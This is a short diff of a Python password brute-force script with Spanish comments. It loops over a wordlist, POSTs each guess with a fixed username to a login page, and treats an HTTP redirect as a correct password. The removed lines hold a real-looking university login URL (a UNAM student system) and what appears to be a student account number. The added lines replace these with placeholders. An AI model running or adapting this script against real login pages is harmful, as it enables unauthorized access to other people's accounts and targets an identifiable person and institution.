@@ -26,10 +26,10 @@ def martillo(nombre):#esta es la funcion donde se hace el proceso
 					flag = True
 			if flag == True:
 				data ={ #son los datos de acceso para el usuario y contraseña
-					'usr':'314144799',
+					'usr':'usuario',
 					'pass':palabra.strip("\n")	
 				}
-				r = requests.post("http://aragon.dgae.unam.mx/php/almn/login.php", data=data, allow_redirects=False) #envio de metodo post
+				r = requests.post("pagina de internet que recibe peticion get", data=data, allow_redirects=False) #envio de metodo post
 				if r.status_code in [300,301,302]: #si regresa estos codigos http significa que cambio de pagina y hay contraseña correcta
 					print("{0} es valida".format(palabra))
 					print(r.status_code)
